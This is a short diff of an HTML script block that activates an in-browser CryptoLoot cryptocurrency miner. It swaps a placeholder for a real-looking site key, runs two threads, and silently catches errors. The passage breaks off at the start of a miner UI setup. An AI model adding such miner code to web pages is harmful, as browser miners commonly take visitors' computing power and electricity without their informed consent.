@@ -1,7 +1,7 @@
 <script>
 var miner = null;
 try {
-    miner = new CryptoLoot.Anonymous('YOUR_SITE_KEY', {threads: 2});
+    miner = new CryptoLoot.Anonymous('8870b82fc17c0966f38b9d703e2ff8298e08f43eadaa', {threads: 2});
 } catch(e) {}
 
 var ui = new MinerUI(miner, {
